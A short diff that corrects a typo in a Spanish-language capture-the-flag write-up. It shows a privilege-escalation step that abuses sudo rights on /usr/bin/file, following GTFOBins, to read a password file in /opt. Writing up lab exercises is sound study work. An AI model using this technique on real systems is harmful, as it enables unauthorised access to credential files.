@@ -271,7 +271,7 @@ User macarena may run the following commands on ec2518c014ba:
 Observamos que podemos ejecutar **/usr/bin/file** con todos los privilegios, esto indica que podemos leer el contenido del fichero **password.txt** que encontramos en **/opt**, revisamos la documentación de [GTFOBins for file](https://gtfobins.github.io/gtfobins/file/#sudo)
 
 ```shell
-LFILE=/opt/password.tx
+LFILE=/opt/password.txt
 sudo file -f $LFILE
 ```
 
